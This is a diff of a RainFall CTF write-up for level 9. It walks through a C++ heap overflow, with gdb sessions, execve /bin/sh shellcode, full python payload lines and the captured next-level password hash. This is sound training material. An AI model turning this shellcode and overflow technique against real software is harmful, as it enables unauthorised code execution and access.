@@ -1,106 +1,115 @@
 ## LEVEL 9
+---
+### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
+---
 
-This level is a little more special because the original code isn't C but C++. Let's disassembling the program and find a vulnerability.
+This level is a little more spacial...
+```shell
+$ objdump -p level9
+  required from libstdc++.so.6:
+    0x056bafd3 0x00 05 CXXABI_1.3
+    0x08922974 0x00 03 GLIBCXX_3.4
+```
+
+Yes this level isn't C but C++.
+
+The asm file can have some errors because of the language, C++ is way more complex than C to disassemble. For this particular level I used Ghidra to help me to dissassemble the code. But I will stil use the dissassembled code because some parts are not explained in the C++ code.
+
+The first thing to do is to find the vulnerability. Here are all the lines of code below the first argument usage, as it's the only thing that could be interesting for sending a payload.
+
+```cpp
+	n1_ptr->setAnnotation(argv[1]);
+	return ((n2_ptr)->operator+(*n1_ptr));
+```
+
+The only usage of the arguments is in the `setAnnotation()` function. Let's disassemble it because I suspect this function may have a vulnerability.
 
 ```shell
-level9@RainFall:~$ gdb -q level9
-Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
-(gdb) disas main
-Dump of assembler code for function main:
-   0x080485f4 <+0>:	push   %ebp
-   0x080485f5 <+1>:	mov    %esp,%ebp
-   0x080485f7 <+3>:	push   %ebx
-   [...]
-   0x08048674 <+128>:	mov    %eax,(%esp)
-   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+    0x08048733 <+37>:	call   0x8048510 <memcpy@plt> ; Call the memcpy function
+    {
+        memcpy(this->var, n, strlen(n));
+    }
+```
+
+This `memcpy` function can overwrite heap memory if the argument number 1 is too long. Let's see what we can overwrite. Here are the allocations in our program:
+
+
+```shell
+[...]
+    0x08048610 <+28>:	movl   $0x6c,(%esp)
+    0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
+[...]
+    0x08048632 <+62>:	movl   $0x6c,(%esp)
+    0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
+[...]
+```
+
+The program allocates two blocks of 108 bytes each. The first allocation is `n1`, and the second is `n2`. As we previously observed, the heap allocates memory in chunks. Therefore, if I overflow the first allocation, I can overwrite the second one. Now you might be wondering why it's useful to overflow the second allocation. Here's why:
+
+```shell
    0x0804867c <+136>:	mov    0x10(%esp),%eax
-   [...]
-   0x08048698 <+164>:	leave
-   0x08048699 <+165>:	ret
-End of assembler dump.
-(gdb) disas 0x804870e
-Dump of assembler code for function _ZN1N13setAnnotationEPc:
-   0x0804870e <+0>:	push   %ebp
-   0x0804870f <+1>:	mov    %esp,%ebp
-   [...]
-   0x08048730 <+34>:	mov    %edx,(%esp)
-   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
-   0x08048738 <+42>:	leave
-   0x08048739 <+43>:	ret
-End of assembler dump.
+[...]
+   0x08048682 <+142>:	mov    (%eax),%edx
+[...]
+   0x0804868c <+152>:	mov    0x10(%esp),%eax
+   0x08048690 <+156>:	mov    %eax,(%esp)
+   0x08048693 <+159>:	call   *%edx
 ```
 
-The program don't have any `system()` or `execve()` calls, so we have to use a **ShellCode Injection**. We tried to use the same technique than in the previous level, but it didn't work, we cannot just find the EIP and change the return address.
+The program calls the function pointer stored in the second allocation. Therefore, if I overwrite the second allocation, I can invoke any function of my choice. Great, we're almost done. Now I need to determine which function I want to call. After using the `info func` command, I discovered that the program doesn't have the `system` function compiled. Hence, I will need to use a shellcode to obtain a shell.
 
-After many research and using Ghibra we discovered a bunch of interesting things. The first one is the alloacation order, `n1` is allocated before `n2` then the program calls `setAnnotation()` on `n1`. That's means that we can overflow `n2` change the adress pointed. Another interesting thing is that return of `main()` dereferences `n2` and `n1`.
+Now that we have all the necessary knowledge to exploit the program, let's write the payload.
 
-So if we write the `n2` address by overloading the `n1` string with `memcpy()` we can set `n2` address to the address of our **ShellCode**.
-
-To create our Payload we need some informations.
-
----
-
-#### The address of the start of the buffer
+1. We need to overflow the first allocation to overwrite the second one. I need the lenght between the first allocation and the pointer readed by the program. I will use gdb to find it.
 
 ```shell
-level9@RainFall:~$ gdb -q level9
-Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
-(gdb) b *0x0804867c
-Breakpoint 1 at 0x804867c
-(gdb) r "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-Starting program: /home/user/level9/level9 "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+(gdb) b *0x08048677
+Breakpoint 1 at 0x8048677
+(gdb) r AAAA
+Starting program: /home/user/level9/level9 hi
 
-Breakpoint 1, 0x0804867c in main ()
-(gdb) x/32x $eax
-0x804a00c:	0x44434241	0x48474645	0x4c4b4a49	0x504f4e4d
-0x804a01c:	0x54535251	0x58575655	0x00005a59	0x00000000
-0x804a02c:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a03c:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a04c:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a05c:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a06c:	0x00000000	0x00000005	0x00000071	0x08048848
-0x804a07c:	0x00000000	0x00000000	0x00000000	0x00000000
-(gdb)
+Breakpoint 1, 0x08048677 in main ()
+(gdb) x/a $esp+16
+0xbffff710:	0x804a078
+(gdb) x/a $esp+20
+0xbffff714:	0x804a008
+(gdb) x/x 0x804a008+4
+0x804a00c:	0x41414141
 ```
 
-Perfect so the start of our buffer is `0x804a00c`.
+So the distance between these two addresses is 0x6b which is 108 in decimal. So I need to overflow the first allocation with 108 bytes. And the shellcode will be stored at `0x804a00b`.
 
----
+2. Get the shellcode
 
-#### Padding
-
-To find the padding to overflow `n2` we will use the previous output of GDB.
-
-The address `0x08048848` is at position `0x804a078` so we just have to substract `0x804a00c` from `0x804a078` to get the padding.
-
-0x804a078 - 0x804a00c = 0x6c -> 108.
-
-So to overwrite `n2` we have to write 108 before the address
-
----
-
-#### ShellCode
-
-To this level I will use this ShellCode : `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
-
-*To know how to find a ShellCode read the [level2](../level2)*
-
----
-
-#### The address of the start of our ShellCode
-
-To calculate the start of our ShellCode we just have to addition the buffer adress with the distance between the address and the ShellCode.
-
----
-
-### Payload
-
-`python -c 'print "\x10\xa0\x04\x08" + "\x90"*10 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 73 + "\x0c\xa0\x04\x08"' > /tmp/payload`
-
-Perfect, we just have to inject the payload into the program.
+I will use the same shellcode as the level 2 because the system is similar.
 
 ```shell
-level9@RainFall:~$ ./level9 $(cat /tmp/payload)
-$ cat /home/user/bonus0/.pass
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+```
+
+We can know create the payload, and try it in GDB.
+
+```shell
+$ python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 87 + "\x0c\xa0\x04\x08")' > /tmp/payload
+(gdb) r $(cat /tmp/payload)
+Single stepping until exit from function main,
+which has no line number information.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x580b6a08 in ?? ()
+```
+
+Oh, it seems that the program crashed. Let's understand why, for that I will print $edx right before the call.
+
+```shell
+(gdb) x/x $edx
+0x580b6a08:	Cannot access memory at address 0x580b6a08
+```
+
+It appears that `$edx` is not a valid address, but it represents the address of the shellcode. To address this issue, we need to replace the shellcode at the beginning with an address that points to the shellcode. To do that, I will place the address at the beginning of the string. This address will be the same address that I used to overwrite the second allocation, plus 4 bytes.
+
+```shell
+$ python -c 'print("\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 83 + "\x0c\xa0\x04\x08")' > /tmp/payload
+$ echo "cat /home/user/bonus0/.pass" | ./level9 $(cat /tmp/payload)
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-```
+```shell
